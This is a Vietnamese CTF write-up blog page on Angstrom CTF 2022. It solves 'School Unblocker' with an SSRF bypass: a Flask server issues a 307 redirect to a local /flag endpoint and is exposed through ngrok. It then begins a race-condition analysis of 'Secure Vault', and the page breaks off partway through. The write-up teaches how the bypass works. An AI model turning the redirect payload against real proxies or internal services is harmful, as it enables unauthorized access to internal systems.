@@ -1,0 +1,374 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="School UnblockerGetting started Mình được cung cấp 1 file index.js với nội dung như sau: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Angstrom-CTF-2022">
+<meta property="og:url" content="https://woanmeo11.github.io/2022/05/06/Angstrom-CTF-2022/index.html">
+<meta property="og:site_name" content="Wのﾑ刀ﾶ乇の11&#39;丂 乃ﾚのム">
+<meta property="og:description" content="School UnblockerGetting started Mình được cung cấp 1 file index.js với nội dung như sau: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://woanmeo11.github.io/2022/05/06/Angstrom-CTF-2022/school_unblocker.png">
+<meta property="og:image" content="https://woanmeo11.github.io/2022/05/06/Angstrom-CTF-2022/307.jpg">
+<meta property="og:image" content="https://woanmeo11.github.io/2022/05/06/Angstrom-CTF-2022/secure_vault.png">
+<meta property="og:image" content="https://woanmeo11.github.io/2022/05/06/Angstrom-CTF-2022/pikachu.jpg">
+<meta property="og:image" content="https://woanmeo11.github.io/2022/05/06/Angstrom-CTF-2022/console.png">
+<meta property="article:published_time" content="2022-05-06T05:02:52.000Z">
+<meta property="article:modified_time" content="2022-05-06T05:27:08.577Z">
+<meta property="article:author" content="Wのﾑ刀ﾶ乇の11">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://woanmeo11.github.io/2022/05/06/Angstrom-CTF-2022/school_unblocker.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favion.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/android-chrome-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>Angstrom-CTF-2022</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+		<script type="text/x-mathjax-config">
+		  MathJax.Hub.Config({
+			tex2jax: {
+			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+			  inlineMath: [['$','$']]
+			}
+		  });
+		</script>
+		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
+	
+<meta name="generator" content="Hexo 6.0.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2021/12/25/ChristCTF-2021/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://woanmeo11.github.io/2022/05/06/Angstrom-CTF-2022/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://woanmeo11.github.io/2022/05/06/Angstrom-CTF-2022/&text=Angstrom-CTF-2022"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://woanmeo11.github.io/2022/05/06/Angstrom-CTF-2022/&title=Angstrom-CTF-2022"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://woanmeo11.github.io/2022/05/06/Angstrom-CTF-2022/&is_video=false&description=Angstrom-CTF-2022"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Angstrom-CTF-2022&body=Check out this article: https://woanmeo11.github.io/2022/05/06/Angstrom-CTF-2022/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://woanmeo11.github.io/2022/05/06/Angstrom-CTF-2022/&title=Angstrom-CTF-2022"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://woanmeo11.github.io/2022/05/06/Angstrom-CTF-2022/&title=Angstrom-CTF-2022"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://woanmeo11.github.io/2022/05/06/Angstrom-CTF-2022/&title=Angstrom-CTF-2022"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://woanmeo11.github.io/2022/05/06/Angstrom-CTF-2022/&title=Angstrom-CTF-2022"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://woanmeo11.github.io/2022/05/06/Angstrom-CTF-2022/&name=Angstrom-CTF-2022&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://woanmeo11.github.io/2022/05/06/Angstrom-CTF-2022/&t=Angstrom-CTF-2022"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#School-Unblocker"><span class="toc-number">1.</span> <span class="toc-text">School Unblocker</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Getting-started"><span class="toc-number">1.1.</span> <span class="toc-text">Getting started</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#dig-proxy"><span class="toc-number">1.2.</span> <span class="toc-text">$ dig &#x2F;proxy</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Ua-vay-DNS-Rebinding-la-cai-gi"><span class="toc-number">1.3.</span> <span class="toc-text">Ủa, vậy DNS Rebinding là cái gì? :)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Solution"><span class="toc-number">1.4.</span> <span class="toc-text">Solution</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Secure-Vault"><span class="toc-number">2.</span> <span class="toc-text">Secure Vault</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Getting-stared"><span class="toc-number">2.1.</span> <span class="toc-text">Getting stared</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Bug-dau"><span class="toc-number">2.2.</span> <span class="toc-text">Bug đâu?</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Truong-hop-dua"><span class="toc-number">2.3.</span> <span class="toc-text">Trường hợp đua</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Solution-1"><span class="toc-number">2.4.</span> <span class="toc-text">Solution</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#O-nhung-tai-sao-flag-la-actf-is-this-what-uaf-is-chu-khong-phai-actf-is-this-what-race-condition-is"><span class="toc-number">2.5.</span> <span class="toc-text">Ơ nhưng tại sao flag là actf{is_this_what_uaf_is} chứ không phải actf{is_this_what_race_condition_is}?</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        Angstrom-CTF-2022
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Wのﾑ刀ﾶ乇の11</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2022-05-06T05:02:52.000Z" itemprop="datePublished">2022-05-06</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h1 id="School-Unblocker"><a href="#School-Unblocker" class="headerlink" title="School Unblocker"></a>School Unblocker</h1><h2 id="Getting-started"><a href="#Getting-started" class="headerlink" title="Getting started"></a>Getting started</h2><p><img src="/2022/05/06/Angstrom-CTF-2022/school_unblocker.png"></p>
+<p>Mình được cung cấp 1 file <code>index.js</code> với nội dung như sau:</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> express <span class="keyword">from</span> <span class="string">&quot;express&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> fetch <span class="keyword">from</span> <span class="string">&quot;node-fetch&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> path <span class="keyword">from</span> <span class="string">&quot;path&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; fileURLToPath, URL &#125; <span class="keyword">from</span> <span class="string">&quot;url&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; resolve4 &#125; <span class="keyword">from</span> <span class="string">&quot;dns/promises&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isIpv4</span>(<span class="params">str</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> chunks = str.split(<span class="string">&quot;.&quot;</span>).map(<span class="function"><span class="params">x</span> =&gt;</span> <span class="built_in">parseInt</span>(x, <span class="number">10</span>));</span><br><span class="line">    <span class="keyword">return</span> chunks.length === <span class="number">4</span> &amp;&amp; chunks.every(<span class="function"><span class="params">x</span> =&gt;</span> !<span class="built_in">isNaN</span>(x) &amp;&amp; x &gt;= <span class="number">0</span> &amp;&amp; x &lt; <span class="number">256</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isPublicIp</span>(<span class="params">ip</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> chunks = ip.split(<span class="string">&quot;.&quot;</span>).map(<span class="function"><span class="params">x</span> =&gt;</span> <span class="built_in">parseInt</span>(x, <span class="number">10</span>));</span><br><span class="line">    <span class="keyword">if</span> ([<span class="number">127</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">192</span>].includes(chunks[<span class="number">0</span>])) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (chunks[<span class="number">0</span>] == <span class="number">172</span> &amp;&amp; chunks[<span class="number">1</span>] &gt;= <span class="number">16</span> &amp;&amp; chunks[<span class="number">1</span>] &lt; <span class="number">32</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> __dirname = path.dirname(fileURLToPath(<span class="keyword">import</span>.meta.url));</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = express();</span><br><span class="line">app.use(express.urlencoded(&#123; <span class="attr">extended</span>: <span class="literal">false</span> &#125;));</span><br><span class="line"></span><br><span class="line"><span class="comment">// environment config</span></span><br><span class="line"><span class="keyword">const</span> port = <span class="built_in">Number</span>(process.env.PORT) || <span class="number">8080</span>;</span><br><span class="line"><span class="keyword">const</span> flag =</span><br><span class="line">    process.env.FLAG ||</span><br><span class="line">    <span class="string">&quot;actf&#123;someone_is_going_to_submit_this_out_of_desperation&#125;&quot;</span>;</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">&quot;/&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    res.sendFile(path.join(__dirname, <span class="string">&quot;index.html&quot;</span>));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.post(<span class="string">&quot;/proxy&quot;</span>, <span class="keyword">async</span> (req, res) =&gt; &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> url = <span class="keyword">new</span> URL(req.body.url);</span><br><span class="line">        <span class="keyword">const</span> originalHost = url.host;</span><br><span class="line">        <span class="keyword">if</span> (!isIpv4(url.hostname)) &#123;</span><br><span class="line">            <span class="keyword">const</span> ips = <span class="keyword">await</span> resolve4(url.hostname);</span><br><span class="line">            <span class="comment">// no dns rebinding today &gt;:)</span></span><br><span class="line">            url.hostname = ips[<span class="number">0</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!isPublicIp(url.hostname)) &#123;</span><br><span class="line">            res.type(<span class="string">&quot;text/html&quot;</span>).send(<span class="string">&quot;&lt;p&gt;private ip contents redacted&lt;/p&gt;&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">const</span> abort = <span class="keyword">new</span> AbortController();</span><br><span class="line">            <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> abort.abort(), <span class="number">3000</span>);</span><br><span class="line">            <span class="keyword">const</span> resp = <span class="keyword">await</span> fetch(url.toString(), &#123;</span><br><span class="line">                <span class="attr">method</span>: <span class="string">&quot;POST&quot;</span>,</span><br><span class="line">                <span class="attr">body</span>: <span class="string">&quot;ping=pong&quot;</span>,</span><br><span class="line">                <span class="attr">headers</span>: &#123;</span><br><span class="line">                    <span class="attr">Host</span>: originalHost,</span><br><span class="line">                    <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span></span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="attr">signal</span>: abort.signal,</span><br><span class="line">            &#125;);</span><br><span class="line">            res.type(<span class="string">&quot;text/html&quot;</span>).send(<span class="keyword">await</span> resp.text());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">        res.status(<span class="number">400</span>).type(<span class="string">&quot;text/plain&quot;</span>).send(<span class="string">&quot;got error: &quot;</span> + err.message);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// make flag accessible for local debugging purposes only</span></span><br><span class="line"><span class="comment">// also the nginx is at a private ip that isn&#x27;t 127.0.0.1</span></span><br><span class="line"><span class="comment">// it&#x27;s not that easy to get the flag :D</span></span><br><span class="line">app.post(<span class="string">&quot;/flag&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (![<span class="string">&quot;127.0.0.1&quot;</span>, <span class="string">&quot;::ffff:127.0.0.1&quot;</span>].includes(req.socket.remoteAddress)) &#123;</span><br><span class="line">        res.status(<span class="number">400</span>).type(<span class="string">&quot;text/plain&quot;</span>).send(<span class="string">&quot;You don&#x27;t get the flag!&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        res.type(<span class="string">&quot;text/plain&quot;</span>).send(flag);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.listen(port, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`Server listening on port <span class="subst">$&#123;port&#125;</span>`</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>Đọc sơ qua source thì mình thấy được ở đây có 2 endpoint quan trọng:</p>
+<ul>
+<li><code>/proxy</code>: Nhận vào param <code>url</code> thông qua phương thức <code>POST</code> và trả về nội dung của trang web đó</li>
+<li><code>/flag</code>: Nhận vào phương thức <code>POST</code> và trả về flag nếu đây là localhost.</li>
+</ul>
+<p>Ý tưởng ở đây là mình cần truyền vào một <code>url</code> nào đó cho <code>/proxy</code> để nó query đến <code>/flag</code> bằng một địa chỉ localhost để nó nôn ra thứ mình cần :&gt;</p>
+<h2 id="dig-proxy"><a href="#dig-proxy" class="headerlink" title="$ dig /proxy"></a>$ dig /proxy</h2><p>Đào sâu vào route đầu tiên, ngay tại đây có 2 đoạn check khá là khó chịu. </p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!isIpv4(url.hostname)) &#123;</span><br><span class="line">	<span class="keyword">const</span> ips = <span class="keyword">await</span> resolve4(url.hostname);</span><br><span class="line">	<span class="comment">// no dns rebinding today &gt;:)</span></span><br><span class="line">	url.hostname = ips[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!isPublicIp(url.hostname)) &#123;</span><br><span class="line">	res.type(<span class="string">&quot;text/html&quot;</span>).send(<span class="string">&quot;&lt;p&gt;private ip contents redacted&lt;/p&gt;&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>Đầu tiên là đoạn check <code>isIpv4()</code>. Nó sẽ kiểm tra xem URL mình nhập vào có phải là ipv4 hay không, nếu không phải thì gọi hàm <code>resolve4()</code> để query đến DNS và lấy về địa chỉ ip thực sự, sau đó gán ngược lại vào trong <code>url</code>.  </p>
+</li>
+<li><p>Đoạn check thứ hai là <code>isPublicIp()</code>. Sau khi đến được đây thì <code>url</code> hiện tại của mình đã là một ipv4, nếu ip hiện tại mà là private ip thì sẽ bị block.</p>
+</li>
+</ul>
+<p>Vậy hai đoạn check bên trên có ý nghĩa gì? Mình cùng để ý dòng comment phía trên: <strong>no dns rebinding today &gt;:)</strong>, chúng dùng để ngăn chặn một kĩ thuật gọi là DNS Rebinding.</p>
+<h2 id="Ua-vay-DNS-Rebinding-la-cai-gi"><a href="#Ua-vay-DNS-Rebinding-la-cai-gi" class="headerlink" title="Ủa, vậy DNS Rebinding là cái gì? :)"></a>Ủa, vậy DNS Rebinding là cái gì? :)</h2><p>Theo Wikipedia thì</p>
+<blockquote>
+<p>DNS rebinding là một phương thức thao tác giải quyết các tên miền thường được sử dụng như một hình thức tấn công máy tính. Trong cuộc tấn công này, một trang web độc hại khiến khách truy cập chạy tập lệnh phía máy khách tấn công các máy ở nơi khác trên mạng.</p>
+</blockquote>
+<p>Nói một cách dễ hiểu thì nó là một kỹ thuật mà mình có thể cấu hình các bản ghi DNS để khi mà query đến một tên miền chỉ định thì nó sẽ trả về địa chỉ ip tùy ý mà mình đã cấu hình sẵn.</p>
+<p>Quay lại đoạn check khi nãy, để có được flag thì ip của mình phải có dạng <code>127.0.0.1</code> do đó DNS Rebinding của mình sẽ được cấu hình để trả về địa chỉ này. Nhưng mà ở phía sau lại có đoạn check <code>isPublicIp()</code> để chặn cách này -_-</p>
+<p><strong>Ủa vậy nếu như mình cấu hình để DNS trả về 2 ip, ip lần đâu tiên là ip public và ip lần sau là <code>127.0.0.1</code> thì sao?</strong></p>
+<p>Hông bạn ơi :) ngay sau khi query hostname lần đầu tiên thì nó sẽ gán thẳng ip đó vào ngược lại <code>url</code> của mình, nên sau khi pass hết đoạn check, ở lúc gọi hàm <code>fetch()</code> để lấy flag thì <code>url</code> lúc đó là ip public chứ không phải là <code>127.0.0.1</code> mà mình cần:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url.hostname = ips[0];</span><br></pre></td></tr></table></figure>
+
+<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>Thay vì sử dụng DNS Rebinding thì mình có thể sử dụng một cách đơn giản hơn đó là dựng 1 con server be bé để chuyển hướng cái <code>fetch()</code> request đến chỗ <code>127.0.0.1/flag</code>. Vì nó là chuyển hướng nên ip không bị tác động gì đến, vẫn là ip public của server vậy nên đoạn check trước đó sẽ không còn tác dụng :))</p>
+<p>Cái server ấy sẽ trông giống như thế này:</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, redirect</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>, methods = [<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rebinding</span>():</span></span><br><span class="line">	<span class="keyword">return</span> redirect(<span class="string">&#x27;http://0.0.0.0:8080/flag&#x27;</span>, code=<span class="number">307</span>) <span class="comment"># code 307 is for POST method</span></span><br><span class="line"></span><br><span class="line">app.run(<span class="string">&#x27;localhost&#x27;</span>, <span class="number">8000</span>)</span><br></pre></td></tr></table></figure>
+
+<p>Chú ý một điểm là để chuyển hướng các <code>POST</code> request thì mình cần phải dùng các HTTP status code như 307 hay 308, đây là các code chuyển hướng của HTTP.</p>
+<p><img src="/2022/05/06/Angstrom-CTF-2022/307.jpg"></p>
+<p>Việc tiếp theo là mình cần một địa chỉ ip public cho nó để có thể query đến. Mình có thể mở port trên router hoặc đơn giản hơn là sử dụng <code>ngrok</code>:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ ngrok http 8000</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">Web Interface                 http://127.0.0.1:4040                                                                                                         </span><br><span class="line">Forwarding                    http://08c8-14-169-9-18.ngrok.io -&gt; http://localhost:8000                                                                     </span><br><span class="line">Forwarding                    https://08c8-14-169-9-18.ngrok.io -&gt; http://localhost:8000                                                                    </span><br><span class="line">                                                                                                                                                            </span><br><span class="line">Connections                   ttl     opn     rt1     rt5     p50     p90                                                                                   </span><br><span class="line">                              0       0       0.00    0.00    0.00    0.00                                 </span><br></pre></td></tr></table></figure>
+
+<p>Cuối cùng là POST cái url vừa nhận được từ <code>ngrok</code> là xong.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ curl -X POST -d &#x27;url=http://08c8-14-169-9-18.ngrok.io&#x27; &#x27;https://school-unblocker.web.actf.co/proxy&#x27;</span><br><span class="line">actf&#123;dont_authenticate_via_ip_please&#125;</span><br></pre></td></tr></table></figure>
+
+<p>Flag:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">actf&#123;dont_authenticate_via_ip_please&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="Secure-Vault"><a href="#Secure-Vault" class="headerlink" title="Secure Vault"></a>Secure Vault</h1><h2 id="Getting-stared"><a href="#Getting-stared" class="headerlink" title="Getting stared"></a>Getting stared</h2><p><img src="/2022/05/06/Angstrom-CTF-2022/secure_vault.png"></p>
+<p>Ở bài này, người ta cung cấp cho mình một trang web dùng để lưu note và có một số chức năng chính:</p>
+<ul>
+<li><code>/register</code>: Đăng kí account và trả về cookie bên trong là JWT lưu giá trị uid của user</li>
+<li><code>/login</code>: Chỉ là login thôi :)</li>
+<li><code>/delete</code>: Xóa user đang login hiện tại khỏi server</li>
+<li><code>/vault</code>: <code>GET</code> method sẽ trả về note mà user đã lưu hoặc là flag nếu biến <code>restricted</code> khác <code>true</code>. Còn <code>POST</code> method là cập nhật note.</li>
+</ul>
+<h2 id="Bug-dau"><a href="#Bug-dau" class="headerlink" title="Bug đâu?"></a>Bug đâu?</h2><p>Đây là đoạn handle để có flag:</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">app.get(<span class="string">&quot;/vault&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!res.locals.user) &#123;</span><br><span class="line">        res.status(<span class="number">401</span>).send(<span class="string">&quot;Log in first&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">const</span> user = users.get(res.locals.user.uid);</span><br><span class="line">    res.type(<span class="string">&quot;text/plain&quot;</span>).send(user.restricted ? user.vault : flag);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+<p>Bám vào biến <code>user.restricted</code> mình tìm xem có chỗ nào có thể tác động vào <code>restricted</code> hay không. Sau một hồi tìm các lỗi như Prototype pollution hoặc các bug logic khác thì mình không thấy được cái nào :)  </p>
+<h2 id="Truong-hop-dua"><a href="#Truong-hop-dua" class="headerlink" title="Trường hợp đua"></a>Trường hợp đua</h2><p>Mình từng được bảo như này:</p>
+<blockquote>
+<p>Nếu không thấy bug nào trên server thì rất có thể nó sẽ bị dính Race condition hoặc các lỗi tương tự.</p>
+</blockquote>
+<p>Ta cùng quay lại đoạn code trước, ở trong source có 1 route <code>/delete</code> để xóa user khỏi server. <strong>Vậy nếu user bị xóa ngay sau khi vừa pass qua đoạn check login thì sao?</strong></p>
